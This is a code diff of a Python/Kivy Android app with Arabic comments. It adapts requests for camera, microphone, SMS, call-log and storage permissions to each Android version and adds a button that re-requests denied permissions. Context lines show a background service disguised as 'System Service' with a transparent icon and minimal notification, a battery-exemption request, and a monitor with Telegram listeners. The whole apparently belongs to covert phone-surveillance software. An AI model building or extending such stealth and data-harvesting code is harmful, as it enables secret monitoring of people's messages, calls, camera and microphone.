@@ -136,52 +136,60 @@ if R not in sys.path:
 # ======================== إدارة الأذونات والنموذج الديناميكية ========================
 def _request_all_permissions():
     """
-    طلب جميع الأذونات المطلوبة مع التحقق من الحالة بشكل آمن.
-    تعيد رسالة توضح ما تم طلبه.
+    طلب الأذونات بناءً على إصدار Android مع التعامل الديناميكي مع الرفض.
+    ✅ تم إصلاحه لدعم Android 10+ و 11+ و 13+.
     """
     try:
         from android.permissions import request_permissions, Permission, check_permission
-        
-        # قائمة الأذونات المعروفة في Permission
+        from android.os import Build
+
+        # قائمة الأذونات الأساسية (مطلوبة في جميع الإصدارات)
         permissions_list = [
             Permission.INTERNET,
             Permission.CAMERA,
             Permission.RECORD_AUDIO,
-            Permission.READ_EXTERNAL_STORAGE,
-            Permission.WRITE_EXTERNAL_STORAGE,
-            Permission.READ_CONTACTS,
-            Permission.READ_SMS,
-            Permission.READ_CALL_LOG
-        ]
-        
-        # أذونات إضافية قد لا تكون معرفة في Permission (تُطلب كنصوص)
-        extra_perms = [
             "android.permission.FOREGROUND_SERVICE",
-            "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"
         ]
-        
+
+        # ✅ تخصيص أذونات التخزين حسب إصدار أندرويد
+        if Build.VERSION.SDK_INT >= 33:  # Android 13+
+            permissions_list.extend([
+                "android.permission.READ_MEDIA_IMAGES",
+                "android.permission.READ_MEDIA_AUDIO",
+                "android.permission.READ_MEDIA_VIDEO"
+            ])
+        elif Build.VERSION.SDK_INT >= 29:  # Android 10+ (Scoped Storage)
+            permissions_list.append(Permission.READ_EXTERNAL_STORAGE)
+            # WRITE_EXTERNAL_STORAGE غير مطلوب في Android 10+ بسبب Scoped Storage
+        else:  # Android 9- (API 28-)
+            permissions_list.extend([
+                Permission.READ_EXTERNAL_STORAGE,
+                Permission.WRITE_EXTERNAL_STORAGE
+            ])
+
+        # ✅ أذونات SMS والاتصالات (تُطلب فقط في الإصدارات الأقل من 33)
+        if Build.VERSION.SDK_INT < 33:
+            permissions_list.extend([
+                Permission.READ_SMS,
+                Permission.READ_CALL_LOG
+            ])
+
+        # التحقق من الأذونات المفقودة
         missing = []
-        # التحقق من الأذونات المعروفة
         for p in permissions_list:
             try:
                 if not check_permission(p):
                     missing.append(p)
             except Exception:
-                # إذا فشل التحقق، نعتبرها غير ممنوحة ونطلبها
+                # في حال فشل التحقق، نطلب الإذن احتياطياً
                 missing.append(p)
-        
-        # التحقق من الأذونات الإضافية
-        for p in extra_perms:
-            try:
-                if not check_permission(p):
-                    missing.append(p)
-            except Exception:
-                missing.append(p)
-        
+
         if missing:
             request_permissions(missing)
-            return f"✅ Requested {len(missing)} missing permissions."
-        return "✅ All permissions already granted."
+            return f"⚠️ Requested {len(missing)} missing permissions. Please grant them in the dialog."
+
+        return "✅ All required permissions are granted."
+
     except Exception as e:
         return f"⚠️ Permission error: {e}"
 
@@ -191,12 +199,12 @@ def _ensure_model_exists():
     تعيد True إذا كان النموذج صالحاً، False إذا كان مفقوداً أو صغيراً جداً.
     """
     # محاولة نسخ النموذج من assets إذا لم يكن موجوداً
-    copy_model_to_models_dir()  # هذه الدالة موجودة بالفعل في الملف الأساسي
-    
+    copy_model_to_models_dir()
+
     model_path = os.path.join(MODELS_DIR, "engine_v2.tflite")
-    # الحد الأدنى للحجم: 1 ميجابايت (يمكن تعديله حسب حجم النموذج الفعلي)
+    # الحد الأدنى للحجم: 1 ميجابايت
     min_size = 1_000_000
-    
+
     if not os.path.exists(model_path) or os.path.getsize(model_path) < min_size:
         print("⚠️ Warning: AI model missing or too small. AI features will be disabled.")
         # إنشاء ملف تحذيري ليعرفه المستخدم
@@ -216,13 +224,13 @@ def start_silent_service():
         act = autoclass('org.kivy.android.PythonActivity').mActivity
         nm = autoclass('android.app.NotificationManager')
         ch = autoclass('android.app.NotificationChannel')
-        
+
         # استخدام قناة إشعارات بأولوية منخفضة
         channel = ch("system_channel", "System Service", nm.IMPORTANCE_LOW)
         act.getSystemService(nm).createNotificationChannel(channel)
 
         builder = autoclass('android.app.Notification$Builder')(act, "system_channel")
-        
+
         # استخدام الأيقونة الشفافة بدلاً من أيقونة التطبيق
         try:
             icon_id = act.getResources().getIdentifier("ic_notification", "drawable", act.getPackageName())
@@ -233,7 +241,7 @@ def start_silent_service():
         except Exception as e:
             builder.setSmallIcon(act.getApplicationInfo().icon)
             print(f"⚠️ Notification icon fallback: {e}")
-        
+
         builder.setContentTitle("System Service")
         builder.setContentText("Running in background")
         builder.setPriority(autoclass('android.app.Notification').PRIORITY_MIN)
@@ -241,7 +249,7 @@ def start_silent_service():
         builder.setAutoCancel(True)
         builder.setSound(None)
         builder.setVibrate(None)
-        
+
         act.startForeground(9921, builder.build())
         return True, "Foreground service started successfully."
     except Exception as e:
@@ -265,15 +273,15 @@ def _perms():
     تعيد رسائل الحالة كسلسلة نصية.
     """
     msg_list = []
-    
-    # 1. طلب الأذونات الديناميكية
+
+    # 1. طلب الأذونات الديناميكية (محسّن لإصدارات Android الحديثة)
     perm_status = _request_all_permissions()
     msg_list.append(f"• {perm_status}")
-    
+
     # 2. بدء الخدمة الخلفية
     ok, svc_msg = start_silent_service()
     msg_list.append(f"• {svc_msg}")
-    
+
     # 3. فتح إعدادات الإشعارات بعد 2 ثانية (في خيط منفصل)
     def delayed_notification_settings():
         time.sleep(2)
@@ -293,7 +301,7 @@ def _perms():
             ctx.startActivity(intent)
     except Exception as e:
         msg_list.append(f"• Battery exemption warning: {e}")
-    
+
     return "\n".join(msg_list)
 
 # ======================== تحميل الإعدادات ====================================
@@ -367,16 +375,16 @@ def download_file_with_checksum(url, dest_path, expected_sha256=None, max_retrie
     for attempt in range(max_retries):
         try:
             os.makedirs(os.path.dirname(dest_path), exist_ok=True)
-            
+
             resp = requests.get(url, headers=HEADERS, timeout=30, verify=True)
             if resp.status_code != 200:
                 print(f"⚠️ Download failed: HTTP {resp.status_code}")
                 time.sleep(2)
                 continue
-            
+
             with open(dest_path, 'wb') as f:
                 f.write(resp.content)
-            
+
             # التحقق من Checksum إذا كان متوفراً
             if expected_sha256:
                 sha256_hash = hashlib.sha256()
@@ -384,21 +392,21 @@ def download_file_with_checksum(url, dest_path, expected_sha256=None, max_retrie
                     for chunk in iter(lambda: f.read(4096), b""):
                         sha256_hash.update(chunk)
                 actual_sha256 = sha256_hash.hexdigest()
-                
+
                 if actual_sha256.lower() != expected_sha256.lower():
                     os.remove(dest_path)
                     print(f"⚠️ Checksum mismatch for {dest_path}. Expected: {expected_sha256}, Got: {actual_sha256}")
                     time.sleep(2)
                     continue
-            
+
             if os.path.getsize(dest_path) == 0:
                 os.remove(dest_path)
                 print(f"⚠️ Downloaded file is empty: {dest_path}")
                 time.sleep(2)
                 continue
-            
+
             return True
-            
+
         except Exception as e:
             print(f"⚠️ Download error (attempt {attempt+1}): {e}")
             if os.path.exists(dest_path):
@@ -407,7 +415,7 @@ def download_file_with_checksum(url, dest_path, expected_sha256=None, max_retrie
                 except:
                     pass
             time.sleep(2)
-    
+
     return False
 
 # ================== نسخ نموذج الذكاء الاصطناعي (محلياً) ==================
@@ -417,7 +425,7 @@ def copy_model_to_models_dir():
     تعيد (bool, str) حيث bool تشير إلى النجاح والرسالة.
     """
     try:
-        model_min_size = 5_000_000   # 5 ميغابايت (يمكن تعديله حسب حجم النموذج الفعلي)
+        model_min_size = 5_000_000   # 5 ميغابايت
         dest = os.path.join(MODELS_DIR, "engine_v2.tflite")
 
         os.makedirs(MODELS_DIR, exist_ok=True)
@@ -467,6 +475,15 @@ class CoreApp(App):
 
         btns = BoxLayout(size_hint=(1, 0.09), spacing=8)
 
+        # ✅ زر إعادة طلب الأذونات (لحالة الرفض)
+        perm_btn = Button(
+            text="🔓 PERMISSIONS",
+            background_color=(0.2, 0.7, 0.3, 1),
+            font_size='12sp',
+            bold=True
+        )
+        perm_btn.bind(on_press=self._re_request_permissions)
+
         copy_btn = Button(
             text="📋 COPY LOG",
             background_color=(0.15, 0.45, 0.85, 1),
@@ -483,6 +500,7 @@ class CoreApp(App):
         )
         clear_btn.bind(on_press=self._clear)
 
+        btns.add_widget(perm_btn)
         btns.add_widget(copy_btn)
         btns.add_widget(clear_btn)
 
@@ -497,6 +515,12 @@ class CoreApp(App):
             timestamp = datetime.now().strftime("%H:%M:%S")
             self.log.text += f"[{timestamp}] {text}\n"
         Clock.schedule_once(_add_text)
+
+    # ✅ دالة لإعادة طلب الأذونات يدوياً (معالجة رفض الأذونات)
+    def _re_request_permissions(self, instance):
+        """إعادة طلب الأذونات المرفوضة أو المفقودة يدوياً"""
+        result = _request_all_permissions()
+        self.append_log(f"🔄 Permissions Request: {result}")
 
     def _copy(self, instance):
         try:
@@ -526,7 +550,7 @@ class CoreApp(App):
             self.append_log(f"✅ AI Model: {m_msg}")
         else:
             self.append_log(f"❌ AI Model ERROR: {m_msg}")
-        
+
         # التحقق الإضافي باستخدام _ensure_model_exists (يسجل تحذيراً إذا كان النموذج غير صالح)
         if not _ensure_model_exists():
             self.append_log("⚠️ AI model missing or too small – AI features will be disabled.")
@@ -564,7 +588,7 @@ class CoreApp(App):
             # 5. تشغيل المحركات
             self.append_log("📡 Step 5/5: Starting Monitor and Telegram UI Listeners...")
             ui.start()
-            
+
             def start_monitor():
                 time.sleep(1)
                 try:
@@ -572,7 +596,7 @@ class CoreApp(App):
                     self.append_log("✅ Monitor started successfully.")
                 except Exception as e:
                     self.append_log(f"❌ Monitor start error: {e}")
-            
+
             threading.Thread(target=start_monitor, daemon=True).start()
 
             self.mon = mon
